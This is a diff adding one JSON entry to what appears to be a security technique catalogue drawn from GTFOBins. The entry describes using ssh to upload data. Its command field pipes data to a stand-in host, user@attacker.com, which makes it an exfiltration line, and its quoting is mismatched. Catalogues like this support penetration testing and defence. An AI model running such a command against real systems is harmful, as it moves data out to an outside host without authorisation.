@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ssh-upload",
+  "name": "GTFOBins · ssh (upload)",
+  "command": "echo DATA | ssh user@attacker.com 'cat >/path/to/output-file\"",
+  "description": "Use ssh to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ssh",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ssh/#upload",
+  "upstream_id": "ssh/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ssh/"
+    }
+  ]
+}
